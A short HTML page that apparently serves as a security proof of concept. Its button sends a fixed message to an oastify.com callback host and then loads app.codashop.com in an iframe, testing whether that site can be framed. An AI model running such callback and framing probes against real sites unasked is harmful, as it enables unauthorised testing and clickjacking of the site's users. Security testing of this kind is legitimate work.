<!DOCTYPE html>
<html>
<head>
    <title>Button Click Example</title>
</head>
<body>
    <h1>Button Click Example</h1>

    <button id="myButton">Click Me</button>

    <script>
        // Get the button element
        var button = document.getElementById('myButton');

        // Attach a click event listener to the button
        button.addEventListener('click', function() {
            // Create a new XMLHttpRequest object
            var xhr = new XMLHttpRequest();

            // Define the URL to send the text
            var url = 'https://xyzhudzjlsjif311zcaevrn2jtpkdb10.oastify.com';

            // Define the text to send
            var textToSend = 'Hello, I got iframe';

            // Set up the request
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'text/plain');

            // Send the text
            xhr.send(textToSend);

            // Create and append the iframe
            var iframe = document.createElement('iframe');
            iframe.src = 'https://app.codashop.com';
            document.body.appendChild(iframe);
        });
    </script>
</body>
</html>
